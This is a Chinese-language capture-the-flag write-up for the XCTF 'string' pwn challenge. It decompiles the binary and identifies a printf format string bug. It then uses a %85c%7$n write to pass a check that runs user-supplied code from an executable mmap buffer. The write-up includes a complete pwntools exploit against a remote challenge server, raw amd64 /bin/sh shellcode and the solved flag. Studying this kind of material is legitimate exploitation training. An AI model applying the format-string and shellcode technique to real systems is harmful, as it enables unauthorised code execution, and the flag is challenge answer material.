# string

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=fed5e7f5-673a-4b4e-b0f1-9a6c96c3a5b0_2&task_category_id=2)

这题代码量比较大，但是也不至于7级吧？

运行发现长篇的英语，先不看了，反编译+checksec走起。

-   Arch:     amd64-64-little
    <br>RELRO:    Full RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <Br>PIE:      No PIE (0x400000)

```c
undefined8 main(void)
{
  long lVar1;
  undefined4 *puVar2;
  long in_FS_OFFSET;
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  alarm(0x3c);
  PrintMenu();
  puVar2 = (undefined4 *)malloc(8);
  *puVar2 = 0x44;
  puVar2[1] = 0x55;
  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n",puVar2);
  printf("secret[1] is %x\n",puVar2 + 1);
  puts("do not tell anyone ");
  CreateCharacter(puVar2);
  puts("The End.....Really?");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

所以巫师告诉我们两个地址。不知道有啥用，进CreateCharacter看看。

```c
void CreateCharacter(undefined8 param_1)
{
  size_t sVar1;
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("What should your character\'s name be:");
  __isoc99_scanf(&DAT_00401a8b,local_28);
  sVar1 = strlen(local_28);
  if (sVar1 < 13) {
    puts("Creating a new player.");
    FUN_00400a7d();
    FUN_00400bb9();
    FUN_00400ca6(param_1);
  }
  else {
    puts("Hei! What\'s up!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

给人物取个名字。没有漏洞，把那几个函数统统看一遍。

```c
void FUN_00400a7d(void)
{
  int iVar1;
  long in_FS_OFFSET;
  char local_18 [8];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts(" This is a famous but quite unusual inn. The air is fresh and the");
  puts("marble-tiled ground is clean. Few rowdy guests can be seen, and the");
  puts("furniture looks undamaged by brawls, which are very common in other pubs");
  puts("all around the world. The decoration looks extremely valuable and would fit");
  puts("into a palace, but in this city it\'s quite ordinary. In the middle of the");
  puts("room are velvet covered chairs and benches, which surround large oaken");
  puts("tables. A large sign is fixed to the northern wall behind a wooden bar. In");
  puts("one corner you notice a fireplace.");
  puts("There are two obvious exits: east, up.");
  puts("But strange thing is ,no one there.");
  puts("So, where you will go?east or up?:");
  while( true ) {
    __isoc99_scanf(&DAT_00401a8b,local_18);
    iVar1 = strcmp(local_18,"east");
    if (iVar1 == 0) break;
    iVar1 = strcmp(local_18,"east");
    if (iVar1 == 0) break;
    puts("hei! I\'m secious!");
    puts("So, where you will go?:");
  }
  iVar1 = strcmp(local_18,"east");
  if (iVar1 != 0) {
    iVar1 = strcmp(local_18,"up");
    if (iVar1 != 0) {
      puts("YOU KNOW WHAT YOU DO?");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    FUN_004009dd();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

讲了一个没什么用的背景故事。FUN_004009dd也不重要就不放了。

```c
void FUN_00400bb9(void)
{
  long in_FS_OFFSET;
  int local_84;
  undefined8 local_80;
  char local_78 [104];
  long local_10;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_80 = 0;
  puts("You travel a short distance east.That\'s odd, anyone disappear suddenly");
  puts(", what happend?! You just travel , and find another hole");
  puts("You recall, a big black hole will suckk you into it! Know what should you do?");
  puts("go into there(1), or leave(0)?:");
  __isoc99_scanf(&DAT_0040179a,&local_84);
  if (local_84 == 1) {
    puts("A voice heard in your mind");
    puts("\'Give me an address\'");
    __isoc99_scanf(&DAT_00401c00,&local_80);
    puts("And, you wish is:");
    __isoc99_scanf(&DAT_00401a8b,local_78);
    puts("Your wish is");
    printf(local_78);
    puts("I hear it, I hear it....");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

printf(local_78); 明显格式化字符串漏洞。但是还不知道怎么利用，肯定是无法实施栈溢出这种漏洞的。

```c
void FUN_00400ca6(int *param_1)
{
  long lVar1;
  code *__buf;
  long in_FS_OFFSET;
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!");
  puts("Dragon say: HaHa! you were supposed to have a normal");
  puts("RPG game, but I have changed it! you have no weapon and ");
  puts("skill! you could not defeat me !");
  puts("That\'s sound terrible! you meet final boss!but you level is ONE!");
  if (*param_1 == param_1[1]) {
    puts("Wizard: I will help you! USE YOU SPELL");
    __buf = (code *)mmap((void *)0x0,0x1000,7,0x21,-1,0);
    read(0,__buf,0x100);
    (*__buf)(0);
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

你还记得param_1是啥吗？往上走发现param_1由CreateCharacter传入自己的参数，CreateCharacter的参数来自于main的puVar2。__buf中存储的内容会被执行（从(*__buf)(0)这种调用方式以及code类型看出）。回到main看看puVar2是啥。

- *puVar2 = 0x44;
  <br>puVar2[1] = 0x55;

*param_1对应0x44，param_1[1]对应0x55，明显不符合要求，我们需要改写这个值。说到改写，刚刚不是有个格式化字符串漏洞吗？算一下偏移。

- AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
> Your wish is
AAAAAAAA,0x1,0x1,0x7ff9f8424a37,0xc,(nil),0x1f8587040,0x1,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x7ffe41c97200,0x7ffe41c97488

偏移是8。格式化字符串任意写开始。我们需要把*puVar2改写成0x55，也就是85，所以使用%n需要打印85个字符。

- %85c%7$n

%85c打印85个字符，%7$n我不太明白，一直当作占位符来用，写哪个偏移就往哪个偏移对应的地址写入%n格式化的内容。

然后就是进入if语句后要执行的代码。跟rop链区分开，这里要执行的是shellcode。shellcode在pwntools中有，但是在我本机的pwntools中打印不出来。行吧，换个机子打印接着抄过来。

```python
from pwn import *
print(asm(shellcraft.amd64.linux.sh(),arch='amd64').hex(' '))
```

- ### asm
  - 编译指定汇编
  - 语法：pwnlib.asm.asm(code, vma = 0, extract = True, shared = False, ...) → str
  - 参数
    > shellcode (str) – 要编译的汇编代码
    > kwargs (dict) – 在context定义的任何属性，比如arch='arm'

就看一下常用的两个参数就好了。shellcraft.amd64.linux.sh()返回amd64位下的linux的shellcode，编译后就变成了字节。直接打印字节python会尝试转换成字符，所以用hex将原始内容打印出来。记得补上\x，自己手打或者程序都行。exp就出来了。

```python
from pwn import *
p=remote("61.147.171.105",53896)
p.recvuntil("secret[0] is ")
addr=int(p.recv(7),16)
payload=b"%85c"+b'%7$n'
p.sendlineafter("What should your character's name be:",'a')
p.sendlineafter("So, where you will go?east or up?:",'east')
p.sendlineafter("go into there(1), or leave(0)?:",'1')
p.sendlineafter("'Give me an address'",str(addr))
p.sendlineafter("And, you wish is:",payload)
shell_code=b'\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05'
p.sendlineafter("Wizard: I will help you! USE YOU SPELL",shell_code)
p.interactive()
```

- ### Flag
  > cyberpeace{54874bdcf88ce67107d6f6b1a1372acb}